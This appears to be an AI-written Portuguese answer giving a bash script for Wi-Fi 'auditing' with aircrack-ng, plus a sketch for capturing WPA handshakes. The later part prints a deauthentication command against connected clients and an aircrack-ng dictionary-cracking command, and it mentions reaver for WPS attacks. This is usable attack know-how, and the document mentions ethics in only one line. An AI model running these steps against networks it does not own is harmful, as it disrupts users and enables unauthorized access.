




```bash
#!/bin/bash

# Cores para saída
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[0;33m'
NC='\033[0m' # No Color

# Função para exibir mensagens de erro
error() {
  echo -e "${RED}Erro: $1${NC}" >&2
}

# Função para exibir mensagens de sucesso
success() {
  echo -e "${GREEN}$1${NC}"
}

# Função para exibir mensagens de aviso
warning() {
  echo -e "${YELLOW}Aviso: $1${NC}"
}

# Verifica se o usuário é root (necessário para algumas operações)
if [[ "$EUID" -ne 0 ]]; then
  error "Este script precisa ser executado como root."
  exit 1
fi

# Verifica se o aircrack-ng está instalado
if ! command -v aircrack-ng &> /dev/null; then
  error "O pacote aircrack-ng não está instalado. Por favor, instale-o."
  echo "  Exemplo (Debian/Ubuntu): sudo apt-get update && sudo apt-get install aircrack-ng"
  echo "  Exemplo (Fedora/CentOS): sudo dnf install aircrack-ng"
  exit 1
fi

# Define a interface de rede sem fio (você pode precisar ajustar isso)
INTERFACE="wlan0"

# Verifica se a interface existe
if ! ip link show "$INTERFACE" &> /dev/null; then
  error "A interface '$INTERFACE' não foi encontrada."
  echo "  Por favor, verifique o nome da sua interface de rede sem fio com o comando 'iwconfig' ou 'ip a'."
  exit 1
fi

echo -e "\n${YELLOW}Iniciando auditoria básica da rede Wi-Fi...${NC}\n"

# Coloca a interface em modo monitor
echo -e "${YELLOW}[+] Colocando a interface '$INTERFACE' em modo monitor...${NC}"
sudo airmon-ng start "$INTERFACE"
MONITOR_INTERFACE=$(iwconfig | grep -oP "^[a-zA-Z0-9]+(\s+Managed|\s+Monitor)$" | grep Monitor | awk '{print $1}')

if [ -z "$MONITOR_INTERFACE" ]; then
  error "Falha ao colocar a interface em modo monitor."
  exit 1
else
  success "Interface '$MONITOR_INTERFACE' ativada em modo monitor."
fi

# Lista as redes Wi-Fi disponíveis
echo -e "\n${YELLOW}[+] Listando redes Wi-Fi disponíveis...${NC}"
sudo airodump-ng "$MONITOR_INTERFACE" --output-format csv --output audit_scan --write-interval 10 &
echo "Pressione Ctrl+C para interromper a busca e analisar os resultados."
sleep 30 # Aguarda 30 segundos para coletar algumas redes
sudo killall airodump-ng

if [ -f "audit_scan-01.csv" ]; then
  echo -e "\n${YELLOW}[+] Redes Wi-Fi encontradas (arquivo: audit_scan-01.csv):${NC}"
  cat "audit_scan-01.csv" | grep -v "Station MAC" | awk -F',' '{print "BSSID: "$1", ESSID: "$14", Channel: "$3", Encryption: "$5}'
  rm "audit_scan-01.csv" "audit_scan-01.kismet.csv" "audit_scan-01.netxml"
else
  warning "Nenhuma rede Wi-Fi foi detectada dentro do período."
fi

# Desativa o modo monitor
echo -e "\n${YELLOW}[+] Desativando o modo monitor na interface '$MONITOR_INTERFACE'...${NC}"
sudo airmon-ng stop "$MONITOR_INTERFACE"

success "\nAuditoria básica concluída."
```

**Como usar este script:**

1.  **Salve o código:** Salve o código em um arquivo de texto, por exemplo, `wifi_audit.sh`.
2.  **Dê permissão de execução:** Abra o terminal e execute o comando `chmod +x wifi_audit.sh`.
3.  **Execute o script:** Execute o script com permissões de root: `sudo ./wifi_audit.sh`.

**O que este script faz:**

* **Verifica pré-requisitos:** Garante que o script seja executado como root e que o `aircrack-ng` esteja instalado.
* **Define a interface:** Você precisará **editar a variável `INTERFACE`** para o nome correto da sua interface de rede sem fio (geralmente `wlan0`). Use `iwconfig` ou `ip a` para verificar.
* **Coloca a interface em modo monitor:** O modo monitor permite que a placa de rede capture todos os pacotes de rádio ao seu redor, não apenas os destinados a ela.
* **Lista redes Wi-Fi:** Utiliza o `airodump-ng` para escanear as redes Wi-Fi próximas e salva os resultados em um arquivo CSV.
* **Exibe informações básicas:** Lê o arquivo CSV e exibe informações como BSSID (MAC address do ponto de acesso), ESSID (nome da rede), canal e tipo de criptografia.
* **Desativa o modo monitor:** Retorna a interface ao modo gerenciado normal.

**Próximos passos e considerações para uma auditoria mais completa:**

* **Captura de Handshake (WPA/WPA2):** Para testar a força da senha de redes WPA/WPA2, você precisará capturar o "handshake" (uma troca de informações inicial quando um dispositivo se conecta à rede). Isso geralmente envolve desautenticar um cliente conectado para forçá-lo a reconectar. Ferramentas como `aireplay-ng` são usadas para isso.
* **Quebra de Senha (WPA/WPA2):** Uma vez que o handshake é capturado, você pode usar ferramentas como `aircrack-ng` com um arquivo de dicionário para tentar quebrar a senha.
* **Testes de Vulnerabilidades (WPS):** Algumas redes utilizam o WPS (Wi-Fi Protected Setup), que pode ter vulnerabilidades. Ferramentas como `reaver` podem ser usadas para testar essas vulnerabilidades.
* **Análise de Tráfego:** Para entender o tráfego da rede, você pode usar ferramentas como `wireshark` (embora isso geralmente seja feito em modo gerenciado após se conectar à rede).
* **Detecção de Intrusos:** Scripts mais avançados podem tentar identificar atividades suspeitas na rede.
* **Interface Gráfica:** Para facilitar o uso, você poderia considerar a criação de uma interface gráfica (GUI) para o seu script usando ferramentas como `zenity` ou `yad`.
* **Tratamento de Erros:** O script básico pode ser aprimorado com um tratamento de erros mais robusto.
* **Configuração:** Permitir que o usuário configure opções como a interface, o tempo de escaneamento e o arquivo de dicionário seria útil.

**Exemplo de como adicionar a captura de handshake (requer mais complexidade e interação do usuário):**

```bash
#!/bin/bash
# ... (código anterior) ...

# Solicita o BSSID da rede alvo
read -p "Digite o BSSID da rede alvo: " TARGET_BSSID
if [ -z "$TARGET_BSSID" ]; then
  error "BSSID não fornecido."
  exit 1
fi

# Inicia a captura de handshake
echo -e "\n${YELLOW}[+] Iniciando captura de handshake na rede '$TARGET_BSSID'...${NC}"
sudo airodump-ng --bssid "$TARGET_BSSID" -w handshake --channel "$(iwconfig "$MONITOR_INTERFACE" | grep Frequency | awk '{print $4}' | sed 's/GHz.//')" "$MONITOR_INTERFACE" &
echo "Abra outro terminal e execute um ataque de desautenticação (aireplay-ng) contra um cliente conectado a esta rede."
echo "Exemplo: sudo aireplay-ng --deauth 10 -a $TARGET_BSSID -c <MAC_DO_CLIENTE> $MONITOR_INTERFACE"
echo "Aguardando o handshake (arquivo: handshake-01.cap)..."

# Aguarda um tempo para a captura (você pode precisar ajustar isso)
sleep 60
sudo killall airodump-ng

if [ -f "handshake-01.cap" ]; then
  success "Handshake capturado com sucesso! Arquivo: handshake-01.cap"
  echo "Agora você pode tentar quebrar a senha usando uma ferramenta como aircrack-ng."
  echo "Exemplo: aircrack-ng -w <seu_dicionario.txt> handshake-01.cap -b $TARGET_BSSID"
else
  warning "Nenhum handshake foi capturado dentro do período."
fi

# ... (código para desativar o modo monitor) ...
```

Lembre-se que este é apenas um ponto de partida. A auditoria de redes Wi-Fi é um campo vasto e envolve o uso de diversas ferramentas e técnicas. É fundamental entender as implicações legais e éticas antes de realizar qualquer tipo de teste. Use este conhecimento de forma responsável e apenas em suas próprias redes.
